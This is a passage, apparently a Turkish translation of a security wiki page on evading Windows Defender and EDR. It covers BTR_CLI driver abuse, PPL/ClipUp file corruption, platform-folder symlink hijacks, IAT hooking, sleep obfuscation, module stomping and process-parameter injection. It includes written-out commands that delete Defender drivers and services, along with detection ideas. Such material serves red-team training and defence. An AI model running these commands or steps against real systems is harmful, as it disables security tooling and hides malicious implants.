Actions 5 ve 6 için on-wire key/value separator'ı **art arda gelen iki backslash** karakteridir; convention'a uygun biçimde formatlanmış bir path doğru şekilde split edilemez. Feedback file çoğunlukla request'i yansıtır, ancak her item'ın ilk dört data byte'ı sonuçta oluşan `NTSTATUS` değerine dönüşür. Başında flags field bulunmayan actions 1 ve 2 için BTR, bu status'a yer açmak amacıyla path'i dört ayrılmış trailing byte içine kaydırır.<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow ve early-boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI), zincirin tamamını uygular: `BTR.sys` dosyasını local Defender'dan çıkarır, `<random>.sys:changelist` ve bir feedback stream oluşturur, chained actions'ları serialize/checksum/encrypt eder, service registry key'ini doğrudan oluşturur, ardından `-trigger now` için `NtLoadDriver` çağırır veya `-trigger boot` için system-start driver olarak bırakır. Direct registry staging, normal SCM `CreateServiceW` path'ini atlar ve bu nedenle service-install Event ID 7045 oluşturmaz. Boot-triggered artifact'lar daha sonra `BTR_CLI.exe -cleanup <service_name>` ile kaldırılabilir.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0`, kullanılabilir değildir; çünkü BTR, storage stack ve `SystemRoot` linki hazır olmadan önce `DriverEntry` üzerinden file I/O gerçekleştirir. `Start=1` ve high-priority `Boot Bus Extender` group ile birlikte çalıştırıldığında ise Phase 1'de yürütülür: NTFS kullanılabilir durumdadır, ancak system-start security driver'larının ve user-mode EDR service'lerinin çoğu henüz initialize edilmemiştir. `WdFilter` gibi boot-start filter'ları zaten yüklenmiş olabilir; ancak BTR, bir sonraki başlatmadan önce bunların binary'lerini veya service configuration'larını kaldırabilir ve SCM bunları başlatmadan önce service executable'larını silebilir. ELAM bu açığı kapatmaz; çünkü BTR, boot-start evaluation sonrasında çalışır ve geçerli bir Microsoft signature taşır.<sup>[[36]](#references)</sup>

Birden fazla action tek bir transaction içinde yürütülür. PoC, hard-coded `\SystemRoot\Temp\BootClean.log` için Action 1'i öne ekler: BTR bu log'u oluşturur, ardından kendi delete request'ini işleyerek unload olmadan önce log'u siler. Bu, geride kalan kanıtları azaltır; feedback'i `<random>.sys:<random>.dat` içine yerleştirmek ise driver'ı ve her iki stream'i birlikte kaldırmaya olanak tanır.<sup>[[36]](#references)[[37]](#references)</sup>

### Yüksek sinyalli detection korelasyonları

Yalnızca signature kullanan kurallar ve Microsoft vulnerable-driver blocklist'i, BTR'nin amaçlanan işlevlerinin kötüye kullanılmasını ele almaz. Meşru Defender lineage'ını rastgele bir launcher'dan ayırarak aşağıdaki davranışsal korelasyonları tercih edin.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` oluşturulması, BTR staging için evrenseldir. Aynı `.sys` dosyasına bağlı bir `.dat` ADS özellikle şüphelidir; çünkü meşru Defender feedback'i normalde `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` altında tutar.
- **Sysmon 12/13 without System 7045:** `Args=...:changelist` ve `Group=Boot Bus Extender` içeren `HKLM\SYSTEM\CurrentControlSet\Services\<random>` konumunun doğrudan oluşturulmasını, buna karşılık gelen bir SCM installation event olmamasıyla korele edin.
- **Sysmon 6 -> 23:** Defender dışı bir lineage'dan bilinen bir BTR driver load edilmesini, sonrasında `System`/PID 4'e atfedilen file deletion ile korele edin; özellikle security binary'leri söz konusu olduğunda.
- **Sysmon 11 -> 23:** `System`/PID 4 tarafından `\SystemRoot\Temp\BootClean.log` dosyasının hızlı şekilde oluşturulup silinmesi için alert üretin.
- `SeLoadDriverPrivilege` atanmasını/enable edilmesini kısıtlayın ve audit edin; bir security-tool driver'ı `cmd.exe`, PowerShell veya bilinmeyen bir process tarafından stage edildiğinde yalnızca Microsoft signature'ı yeterli güven sağlamaz.

## Protected Process Light (PPL) Abuse Ederek LOLBIN'lerle AV/EDR'a Tamper Etme

Protected Process Light (PPL), yalnızca eşit veya daha yüksek seviyede korunan process'lerin birbirlerine tamper edebilmesini sağlayan bir signer/level hierarchy uygular. Offensive açıdan, PPL-enabled bir binary'yi meşru şekilde başlatabiliyor ve argümanlarını kontrol edebiliyorsanız, benign işlevleri (ör. logging) AV/EDR tarafından kullanılan protected directory'lere karşı kısıtlı, PPL-backed bir write primitive'e dönüştürebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Bir process'i PPL olarak çalıştıran unsurlar
- Hedef EXE (ve yüklenen DLL'ler), PPL-capable bir EKU ile imzalanmış olmalıdır.
- Process, şu flag'ler kullanılarak CreateProcess ile oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Binary'nin signer'ı ile eşleşen uyumlu bir protection level talep edilmelidir (ör. anti-malware signer'ları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signer'ları için `PROTECTION_LEVEL_WINDOWS`). Yanlış level'lar creation işleminin başarısız olmasına neden olur.

PP/PPL ve LSASS protection hakkında daha geniş bir giriş için ayrıca bkz.:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level'ı seçer ve argümanları hedef EXE'ye iletir):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- İmzalı sistem binary'si `C:\Windows\System32\ClipUp.exe` kendisini başlatır ve log file'ını caller tarafından belirtilen bir path'e yazmak için bir parameter kabul eder.
- PPL process olarak başlatıldığında file write işlemi PPL backing ile gerçekleşir.
- ClipUp, spaces içeren path'leri parse edemez; normalde korunan konumları göstermek için 8.3 short path'lerini kullanın.

8.3 short path helpers
- Short name'leri listeleyin: Her parent directory'de `dir /x`.
- cmd'de short path'i türetin: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN'i (ClipUp) bir launcher (ör. CreateProcessAsPPL) kullanarak `CREATE_PROTECTED_PROCESS` ile başlatın.
2) Protected AV directory'sinde (ör. Defender Platform) file creation işlemini zorlamak için ClipUp log-path argument'ını geçin. Gerekirse 8.3 short name'lerini kullanın.
3) Target binary çalışırken AV tarafından normalde open/locked durumdaysa (ör. MsMpEng.exe), write işlemini boot sırasında, AV başlamadan önce çalışacağı güvenilir biçimde daha erken bir auto-start service yükleyerek planlayın. Boot ordering'i Process Monitor (boot logging) ile doğrulayın.
4) Reboot sonrasında PPL-backed write, AV binary'lerini lock'lamadan önce gerçekleşir; target file'ı bozarak startup'ı engeller.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notlar ve kısıtlamalar
- ClipUp'ın yazdığı içeriği yerleştirme dışında kontrol edemezsiniz; primitive, hassas içerik enjeksiyonundan ziyade corruption için uygundur.
- Bir service'ı kurmak/başlatmak ve reboot window gerektirir; bunun için local admin/SYSTEM gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; boot-time execution file lock'larını önler.

Tespitler
- Özellikle boot sırasında non-standard launcher'lar tarafından parent edilen, olağandışı argümanlara sahip `ClipUp.exe` process creation olayları.
- Şüpheli binary'leri auto-start olarak yapılandıran ve Defender/AV'den önce tutarlı şekilde başlayan yeni service'lar. Defender startup failures öncesindeki service oluşturma/değişikliklerini araştırın.
- Defender binary'leri/Platform directory'leri üzerinde file integrity monitoring; protected-process flag'lerine sahip process'ler tarafından beklenmeyen file creation/modification olayları.
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` ile oluşturulan process'leri ve AV olmayan binary'ler tarafından yapılan anomalous PPL level kullanımını arayın.

Azaltımlar
- WDAC/Code Integrity: hangi signed binary'lerin PPL olarak ve hangi parent'lar altında çalışabileceğini kısıtlayın; ClipUp invocation'ını legitimate context'ler dışında engelleyin.
- Service hygiene: auto-start service'ların oluşturulmasını/değiştirilmesini kısıtlayın ve start-order manipulation'ı izleyin.
- Defender tamper protection ve early-launch protections'ın etkin olduğundan emin olun; binary corruption'a işaret eden startup error'larını araştırın.
- Ortamınızla uyumluysa security tooling barındıran volume'larda 8.3 short-name generation'ı devre dışı bırakmayı değerlendirin (kapsamlı şekilde test edin).

## Microsoft Defender'a Platform Version Folder Symlink Hijack ile Müdahale

Windows Defender, çalışacağı platformu şu konumun altındaki subfolder'ları enumerate ederek seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek lexicographic version string'e sahip subfolder'ı (ör. `4.18.25070.5-0`) seçer, ardından Defender service process'lerini buradan başlatır (service/registry path'lerini buna göre günceller). Bu seçim, directory reparse point'leri (symlink'ler) dahil olmak üzere directory entry'lerine güvenir. Bir administrator, Defender'ı attacker-writable bir path'e yönlendirmek ve DLL sideloading veya service disruption elde etmek için bundan yararlanabilir.<sup>[[21]](#references)[[22]](#references)</sup>

Ön koşullar
- Local Administrator (Platform folder altında directory/symlink oluşturmak için gereklidir)
- Reboot gerçekleştirme veya Defender platform re-selection'ını tetikleme yeteneği (boot sırasında service restart)
- Yalnızca built-in tools gereklidir (`mklink`)

Neden çalışır
- Defender kendi folder'larında write işlemlerini engeller, ancak platform selection directory entry'lerine güvenir ve target'ın protected/trusted bir path'e çözümlendiğini doğrulamadan lexicographically en yüksek version'ı seçer.

Adım adım (örnek)
1) Mevcut platform folder'ının writable bir clone'unu hazırlayın; örneğin `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden daha yüksek sürümlü bir directory symlink oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)'in yönlendirilen yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni process path'ini `C:\TMP\AV\` altında ve service configuration/registry'nin bu konumu yansıttığını gözlemlemelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender'ın application directory'sinden yüklediği DLL'leri, Defender'ın process'lerinde code execution gerçekleştirmek için bırakın/değiştirin. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Version-symlink'i kaldırın; böylece bir sonraki başlatmada configured path çözümlenemez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Bu tekniğin tek başına privilege escalation sağlamadığını; admin rights gerektirdiğini unutmayın.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams, runtime evasion'ı C2 implant'ından çıkarıp hedef modülün içine taşıyabilir; bunun için modülün Import Address Table'ını (IAT) hook'layarak seçili API'leri saldırganın kontrolündeki position-independent code'a (PIC) yönlendirebilir. Bu, evasion'ı birçok kitin sunduğu küçük API yüzeyinin (ör. CreateProcessA) ötesine geneller ve aynı korumaları BOF'lar ile post-exploitation DLL'lerine de genişletir.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Yüksek seviyeli yaklaşım
- Bir reflective loader kullanarak hedef modülün yanında (prepend edilmiş veya companion olarak) bir PIC blob stage edin. PIC kendi kendine yeterli ve position-independent olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR'ında gezinerek hedeflenen import'lar için IAT girdelerini (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ince PIC wrapper'larını gösterecek şekilde patch'leyin.
- Her PIC wrapper, gerçek API adresine tail-call yapmadan önce evasion tekniklerini çalıştırır. Tipik evasion teknikleri şunları içerir:
- Çağrı çevresinde memory mask/unmask uygulama (ör. beacon bölgelerini encrypt etme, RWX→RX, sayfa adlarını/izinlerini değiştirme), ardından çağrı sonrasında geri yükleme.
- Call-stack spoofing: benign bir stack oluşturup hedef API'ye geçiş yaparak call-stack analizinin beklenen frame'leri çözümlemesini sağlama.<sup>[[9]](#references)</sup>
- Uyumluluk için, bir Aggressor script'in (veya eşdeğerinin) Beacon, BOF'lar ve post-ex DLL'leri için hangi API'lerin hook'lanacağını kaydedebilmesi amacıyla bir interface export edin.

Burada neden IAT hooking kullanılıyor
- Hook'lanmış import'u kullanan tüm code'lar için çalışır; tool code'unu değiştirmeyi veya belirli API'leri proxy'lemek üzere Beacon'a güvenmeyi gerektirmez.
- Post-ex DLL'lerini kapsar: LoadLibrary*'ı hook'lamak, modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) intercept etmenizi ve aynı masking/stack evasion tekniklerini bunların API çağrılarına uygulamanızı sağlar.
- CreateProcessA/W'i wrapper'layarak call-stack tabanlı detection'lara karşı process-spawning post-ex command'larının güvenilir şekilde kullanılmasını yeniden sağlar.

Minimal IAT hook taslağı (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Patch'i relocations/ASLR sonrasında ve import'un ilk kullanımından önce uygulayın. TitanLdr/AceLdr gibi Reflective loader'lar, yüklenen modülün DllMain'i sırasında hooking gerçekleştirildiğini gösterir.
- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi patch işlemi öncesinde yakaladığınız original IAT değeri üzerinden veya LdrGetProcedureAddress ile resolve edin.
- PIC için RW → RX geçişleri kullanın ve writable+executable sayfalar bırakmaktan kaçının.

Call-stack spoofing stub
- Draugr-style PIC stub'lar sahte bir call chain (benign modüller içindeki return address'ler) oluşturur ve ardından gerçek API'ye pivot eder.
- Bu, Beacon/BOF'lardan sensitive API'lere giden canonical stack'leri bekleyen detection'ları etkisizleştirir.
- API prologue'undan önce beklenen frame'lerin içine yerleşmek için stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operational integration
- PIC ve hook'ların DLL yüklendiğinde otomatik olarak initialize olması için reflective loader'ı post-ex DLL'lerin başına ekleyin.
- Beacon ve BOF'ların code değişikliği olmadan aynı evasion path'ten şeffaf şekilde yararlanması için hedef API'leri register eden bir Aggressor script kullanın.

Detection/DFIR considerations
- IAT integrity: non-image (heap/anon) adreslerine resolve olan entry'ler; import pointer'larının periyodik olarak doğrulanması.
- Stack anomalies: loaded image'lara ait olmayan return address'ler; non-image PIC'e ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetry: IAT üzerinde in-process write işlemleri, import thunk'larını değiştiren erken DllMain activity, load sırasında oluşturulan beklenmeyen RX region'lar.
- Image-load evasion: hooking LoadLibrary* yapılıyorsa, memory masking event'leriyle ilişkili şüpheli automation/clr assembly load'larını izleyin.

Related building blocks and examples
- Load sırasında IAT patching gerçekleştiren reflective loader'lar (örn. TitanLdr, AceLdr)
- Memory masking hook'ları (örn. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub'ları (örn. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident PICO üzerinden import-time IAT hook'ları

Bir reflective loader'ı kontrol ediyorsanız, loader'ın `GetProcAddress` pointer'ını önce hook'ları kontrol eden custom resolver ile değiştirerek import'ları **`ProcessImports()` sırasında** hook'layabilirsiniz:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Transient loader PIC kendisini free ettikten sonra hayatta kalan bir **resident PICO** (persistent PIC object) oluşturun.
- Loader'ın import resolver'ını overwrite eden bir `setup_hooks()` function export edin (örn. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal import'larını atlayın ve `__resolve_hook(ror13hash(name))` gibi hash-based bir hook lookup kullanın. Bir hook varsa onu return edin; yoksa gerçek `GetProcAddress`'e delegate edin.
- Hook target'larını Crystal Palace ile link time'da `addhook "MODULE$Func" "hook"` entry'leri kullanarak register edin. Hook, resident PICO içinde bulunduğu için geçerliliğini korur.

Bu yöntem, loaded DLL'nin code section'ını load sonrasında patch etmeden **import-time IAT redirection** sağlar.

### Target PEB-walking kullanıyorsa hook'lanabilir import'ları zorlama

Import-time hook'lar yalnızca function target'ın IAT'ında gerçekten bulunuyorsa trigger edilir. Bir module API'leri PEB-walk + hash ile resolve ediyorsa (import entry yoksa), loader'ın `ProcessImports()` path'inin bunu görmesi için gerçek bir import zorlayın:

- Hashed export resolution'ı (örn. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir reference ile değiştirin.
- Compiler bir IAT entry emit eder; bu da reflective loader import'ları resolve ederken interception'ı mümkün kılar.

### `Sleep()` patch etmeden Ekko-style sleep/idle obfuscation

`Sleep` patch etmek yerine implant'ın kullandığı **gerçek wait/IPC primitive'lerini** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) hook'layın. Uzun wait'ler için call'ı, idle sırasında in-memory image'ı encrypt eden Ekko-style bir obfuscation chain içine wrap edin:<sup>[[31]](#references)[[27]](#references)</sup>

- `NtContinue`'ı crafted `CONTEXT` frame'leriyle çağıran callback sequence'ini planlamak için `CreateTimerQueueTimer` kullanın.
- Tipik chain (x64): image'ı `PAGE_READWRITE` olarak ayarlayın → mapped image'ın tamamı üzerinde `advapi32!SystemFunction032` ile RC4 encrypt işlemi yapın → blocking wait gerçekleştirin → RC4 decrypt işlemi yapın → PE section'ları walk ederek **per-section permission'ları restore edin** → completion signal'ı gönderin.
- `RtlCaptureContext` bir template `CONTEXT` sağlar; bunu birden fazla frame'e clone edin ve her adımı invoke etmek için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operational detail: Uzun wait'ler için (örn. `WAIT_OBJECT_0`) caller'ın image masked durumdayken devam etmesi amacıyla “success” return edin. Bu pattern, idle window'ları sırasında module'ü scanner'larda gizler ve klasik “patched `Sleep()`” signature'ından kaçınır.

Detection ideas (telemetry-based)
- `NtContinue`'a işaret eden `CreateTimerQueueTimer` callback burst'leri.
- Büyük, contiguous ve image-sized buffer'lar üzerinde kullanılan `advapi32!SystemFunction032`.
- Büyük aralıklı `VirtualProtect` çağrısını izleyen custom per-section permission restoration.

### Sleep-obfuscation gadget'ları için runtime CFG registration

CFG-enabled target'larda `jmp [rbx]` veya `jmp rdi` gibi bir mid-function gadget'a yapılan ilk indirect jump, gadget modülün CFG metadata'sında bulunmadığı için genellikle `STATUS_STACK_BUFFER_OVERRUN` ile process'in crash olmasına neden olur. Ekko/Kraken-style chain'leri hardened process'ler içinde çalışır durumda tutmak için:<sup>[[30]](#references)</sup>

- Chain tarafından kullanılan her indirect destination'ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` entry'leri ile register edin.
- Loaded image'lar (`ntdll`, `kernel32`, `advapi32`) içindeki adresler için `MEMORY_RANGE_ENTRY`, **image base**'te başlamalı ve **image size'ın tamamını** kapsamalıdır.
- Manually mapped/PIC/stomped region'lar için bunun yerine **allocation base** ve allocation size kullanın.
- Yalnızca dispatch gadget'ını değil, indirect olarak ulaşılan export'ları da (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall'ları) ve indirect target olacak attacker-controlled executable section'ları da mark edin.

Bu işlem, ROP/JOP-style sleep chain'lerini “yalnızca non-CFG process'lerde çalışır” durumundan `explorer.exe`, browser'lar, `svchost.exe` ve `/guard:cf` ile compile edilmiş diğer endpoint'ler için yeniden kullanılabilir bir primitive'e dönüştürür.

### Sleeping thread'ler için CET-safe stack spoofing

Full `CONTEXT` replacement gürültülüdür ve CET Shadow Stack sistemlerinde bozulabilir; çünkü spoof edilmiş `Rip` yine de hardware shadow stack ile uyuşmalıdır. Daha güvenli bir sleep-masking pattern şöyledir:<sup>[[30]](#references)</sup>

- Aynı process içindeki başka bir thread'i seçin ve `NtQueryInformationThread` üzerinden onun `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) değerlerini okuyun.
- Mevcut thread'in gerçek TEB/TIB'sini backup edin.
- Gerçek sleeping context'i `GetThreadContext` ile capture edin.
- Spoof context'e yalnızca gerçek `Rip` değerini copy edin; spoof edilmiş `Rsp`/stack state'i olduğu gibi bırakın.
- Sleep window sırasında, stack walker'ların legitimate stack range içinde unwind etmesi için spoof thread'in `NT_TIB`'sini current TEB'e copy edin.
- Wait tamamlandıktan sonra original TIB ve thread context'i restore edin.

Bu yöntem CET-consistent instruction pointer'ı korurken, unwind'leri doğrulamak için TEB stack metadata'sına güvenen EDR stack walker'larını yanıltır.

### APC-based alternative: Kraken Mask

Timer-queue dispatch fazla signature'lıysa, aynı sleep-encrypt-spoof-restore sequence'i queued APC'ler kullanan suspended helper thread üzerinden execute edilebilir:<sup>[[27]](#references)</sup>

- Entry point olarak `NtTestAlert` kullanan bir helper thread oluşturun.
- Hazırlanmış `CONTEXT` frame/APC'lerini `NtQueueApcThread` ile queue'layın ve `NtAlertResumeThread` ile drain edin.
- Default 64 KB thread stack'ini tüketmemek için chain state'i helper stack yerine heap üzerinde saklayın.
- Start event'i atomically signal etmek ve block olmak için `NtSignalAndWaitForSingleObject` kullanın.
- Bir scanner'ın half-restored stack'i yakalayabileceği race window'ını azaltmak için TIB/context'i restore etmeden önce main thread'i suspend edin (`NtSuspendThread` → restore → `NtResumeThread`).

Bu yöntem, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` signature'ını helper-thread/APC signature'ı ile değiştirir.

Additional detection ideas
- Sleep, wait veya APC dispatch'ten kısa süre önce `VmCfgCallTargetInformation` ile kullanılan `NtSetInformationVirtualMemory`.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` etrafında wrap edilen `GetThreadContext`/`SetThreadContext`.
- `NtQueryInformationThread` çağrısını izleyen ve current thread'in TEB/TIB stack bounds değerlerine doğrudan write yapan işlemler.
- Dolaylı olarak `SystemFunction032`, `VirtualProtect` veya section-permission restoration helper'larına ulaşan `NtQueueApcThread`/`NtAlertResumeThread` chain'leri.
- Signed module'ler içindeki dispatch pivot'ları olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget signature'larının tekrarlanan kullanımı.


## Precision Module Stomping

Module stomping, açık private executable memory allocate etmek veya yeni bir sacrificial DLL load etmek yerine payload'ları target process içinde zaten mapped olan bir DLL'nin **`.text` section'ından** execute eder. Overwrite target, process'in hâlâ ihtiyaç duyduğu code path'leri bozmadan payload'ı barındırabilecek, **loaded ve disk-backed bir image** olmalıdır.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

`uxtheme.dll` veya `comctl32.dll` gibi common module'lere karşı yapılan naive stomping kırılgandır: DLL remote process'te loaded olmayabilir ve code region'ın fazla küçük olması process'in crash olmasına neden olur. Daha güvenilir bir workflow:

1. Target process module'lerini enumerate edin ve zaten loaded olan DLL'lerden **names-only include list** oluşturun.
2. Önce payload'ı build edin ve **exact byte size** değerini kaydedin.
3. Candidate DLL'leri disk üzerinde scan edin ve PE section **`.text` `Misc_VirtualSize`** değerini payload size ile karşılaştırın. Bu, executable section'ın **memory'ye map edildiğindeki** boyutunu yansıttığı için file size'dan daha önemlidir.
4. **Export Address Table (EAT)**'i parse edin ve stomp start offset olarak bir exported function RVA seçin.
5. **Blast radius**'ı hesaplayın: payload seçilen function boundary'yi aşarsa, memory'de onun ardından yerleştirilmiş adjacent export'ları overwrite eder.

Wild'de görülen tipik recon/selection helper'ları:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- `LoadLibrary`/unexpected image loads telemetry’sinden kaçınmak için uzak process içinde **zaten yüklenmiş** DLL’leri tercih edin.
- Hedef uygulama tarafından nadiren çalıştırılan export’ları tercih edin; aksi takdirde normal code path’leri thread oluşturulmadan önce veya sonra stomp edilmiş byte’lara ulaşabilir.
- Büyük implant’lar genellikle shellcode embedding işleminin bir string literal’den **byte-array/braced initializer** biçimine değiştirilmesini gerektirir; böylece tam buffer injector source içinde doğru şekilde temsil edilir.

Detection ideas
- Daha yaygın private RWX/RX allocation’lar yerine **image-backed executable page’lere** (`MEM_IMAGE`, `PAGE_EXECUTE*`) yapılan remote write işlemleri.
- Bellekteki byte’ları diskteki backing file ile artık eşleşmeyen export entry point’leri.
- Yakın zamanda ilk byte’ları değiştirilmiş meşru bir DLL export’u içinde çalışmaya başlayan remote thread’ler veya context pivot’ları.
- DLL `.text` page’lerine karşı gerçekleştirilen ve ardından thread creation ile devam eden şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` dizileri.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik remote write path’ini (`VirtualAllocEx` + `WriteProcessMemory`) kullanmayan bir **process-injection / EDR-evasion** tekniğidir. Hâlihazırda çalışan bir hedefe byte kopyalamak yerine, Windows’un `CreateProcessW` startup parametrelerinin belirli bölümlerini child process’e **kopyalaması** ve bunları `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklaması gerçeğini kötüye kullanır.<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Kullanışlı carrier’lar şunlardır:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Practical carrier constraints:

- `lpCommandLine`, `CreateProcessW` için **yazılabilir belleğe** işaret etmelidir ve null terminator dahil **32.767 Unicode karakter** ile sınırlıdır.
- `lpEnvironment`, art arda gelen `NAME=VALUE\0` string’lerinden oluşan ve ek bir `\0` ile sonlandırılan bir Unicode environment block olmalıdır.
- `lpReserved` resmî olarak ayrılmış olduğundan `ShellInfo` mapping’i, kararlı ve belgelenmiş bir contract yerine implementation detail olarak değerlendirilmelidir.

Bu durum, normal process creation işlemini **payload-transfer primitive** hâline getirir. Operator, child process’i attacker-controlled startup data ile oluşturur ve Windows’un cross-process copy işlemini gerçekleştirmesine izin verir.

### Remote lookup flow without remote write APIs

Child oluşturulduktan sonra, kopyalanan buffer’ı **salt-okunur** primitive’ler kullanarak resolve edin:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
2. Remote `PEB`’i okuyun
3. `PEB.ProcessParameters` değerini takip edin
4. `RTL_USER_PROCESS_PARAMETERS` okuyun
5. Seçilen pointer’ı kullanın:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Kopyalanan parameter buffer'ını çalıştırma

Kopyalanan parameter bölgesi genellikle `RW` durumundadır ve executable değildir. Yaygın bir P3 chain şöyledir:

1. Process'i normal şekilde oluşturun (suspended olarak değil)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` ile seçilen parameter page'i executable hâle getirin
3. `PROCESS_INFORMATION` içinde zaten döndürülen main thread handle'ını yeniden kullanın
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP`'i overwrite ederek) ile execution'ı yönlendirin

Classic thread hijacking workflow'larının aksine bu işlem `SuspendThread` / `ResumeThread` gerektirmez; context, döndürülen main thread handle'ı üzerinden doğrudan değiştirilebilir.

Bu yaklaşım, injection için yaygın olarak izlenen çeşitli API'lerden kaçınır:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu zaman ayrıca `SuspendThread` / `ResumeThread`

### Null-byte sınırlaması ve staged shellcode

